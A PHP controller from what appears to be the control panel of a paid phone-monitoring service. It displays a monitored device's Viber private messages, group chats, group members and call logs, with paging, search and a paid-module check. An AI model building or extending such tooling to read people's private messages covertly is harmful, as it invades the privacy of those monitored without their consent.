<?php

namespace Controllers;

use System\FlashMessages,
    Models\Modules,
    CS\Devices\Limitations;

class Viber extends BaseModuleController
{

    protected $module = Modules::VIBER;

    protected function init()
    {
        parent::init();

        $this->initCP();
    }

    public function indexAction()
    {
        $viberModel = new \Models\Cp\Viber($this->di);

        if ($this->getRequest()->isAjax()) {
            $dataTableRequest = new \System\DataTableRequest($this->di);

            switch ($this->params['tab']) {
                case 'private':
                    $data = $viberModel->getPrivateDataTableData(
                            $this->di['devId'], $dataTableRequest->buildResult(array('timeFrom', 'timeTo'))
                    );
                    break;
                case 'group':
                    $data = $viberModel->getGroupDataTableData(
                            $this->di['devId'], $dataTableRequest->buildResult(array('timeFrom', 'timeTo'))
                    );
                    break;
                case 'calls':
                    $data = $viberModel->getCallsDataTableData(
                            $this->di['devId'], $dataTableRequest->buildResult(array('timeFrom', 'timeTo'))
                    );
                    break;
            }
            $this->checkDisplayLength($dataTableRequest->getDisplayLength());
            $this->makeJSONResponse($data);
        }

        if ($this->view->paid) {
            $this->view->hasRecords = $viberModel->hasRecords($this->di['devId']);
        }

        $this->setView('cp/viber.htm');
    }

    public function listAction()
    {
        $viberModel = new \Models\Cp\Viber($this->di);

        if ($this->getRequest()->isAjax()) {
            
            $currPage = ($this->getRequest()->hasPost('currPage') && $this->getRequest()->post('currPage') > 0) ? $this->getRequest()->post('currPage') : 0;
            $perPage = ($this->getRequest()->hasPost('perPage') && $this->getRequest()->post('perPage') > 0) ? $this->getRequest()->post('perPage') : $this->lengthPage;
            $search = ($this->getRequest()->hasPost('search')) ? $this->getRequest()->post('search') : false;
            
            $data = array();
            if($this->params['tab'] == 'private')
                $data = $viberModel->getItemsPrivateList($this->di['devId'], urlencode( $this->params['id'] ), $search, $currPage, $perPage);
            
            if($this->params['tab'] == 'group')
                $data = $viberModel->getItemsGroupList($this->di['devId'], urlencode( $this->params['id'] ), $search, $currPage, $perPage);
            
            $this->makeJSONResponse($data);
        }
        
        switch ($this->params['tab']) {
            case 'group':
                $this->view->list = $viberModel->getGroupList($this->di['devId'], $this->params['id']);
                $this->view->users = $viberModel->getGroupUsers($this->di['devId'], $this->params['id']);
                break;

            case 'private':
                $this->view->list = $viberModel->getPrivateList($this->di['devId'], $this->params['id']);
                break;
        }

        if (!count($this->view->list)) {
            $this->di['flashMessages']->add(FlashMessages::ERROR, $this->di['t']->_('The dialogue has not been found!'));
            $this->redirect($this->di['router']->getRouteUrl('viber'));
        }

        $this->view->tab = $this->params['tab'];
        $this->view->id = $this->params['id'];

        $this->setView('cp/viberList.htm');
    }

    protected function postAction()
    {
        parent::postAction();
        $this->buildCpMenu();

        $this->view->title = $this->di['t']->_('Viber');
    }
    
    protected function isModulePaid()
    {
        $devicesLimitations = new Limitations($this->di['db']);
        return $devicesLimitations->isAllowed($this->di['devId'], Limitations::VIBER);
    }
    

}
